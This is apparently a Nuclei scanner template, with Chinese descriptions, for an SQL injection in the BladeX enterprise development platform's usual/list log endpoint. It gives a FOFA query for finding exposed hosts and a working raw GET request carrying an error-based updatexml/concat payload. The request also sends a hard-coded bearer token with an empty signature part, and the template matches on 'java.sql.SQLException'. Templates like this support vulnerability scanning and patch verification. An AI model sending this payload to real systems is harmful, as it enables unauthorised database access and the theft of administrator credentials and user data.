id: BladeX-usual_list-sql

info:
  name: "BladeX企业级开发平台 usual 接口 SQL注入"
  author: Unknown
  severity: high
  description: |-
    fofa: body="https://bladex.vip"
      BladeX企业级开发平台在usual/list接口处理过程中存在SQL注入缺陷。攻击者可通过构造恶意SQL查询实现数据库信息泄露，包括但不限于管理员凭证及用户敏感数据。在具备高权限访问条件下，可能进一步利用路径写入功能植入恶意代码，导致服务器控制权丧失。
  reference:
  - https://blog.csdn.net/m0_60571842/article/details/140955875
  tags: BladeX企业级开发平台


http:
- raw:
  - |
    GET /api/blade-log/usual/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
    Host: {{Hostname}}
    Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ

  matchers:
  - type: word
    part: body
    words:
    - 'java.sql.SQLException'






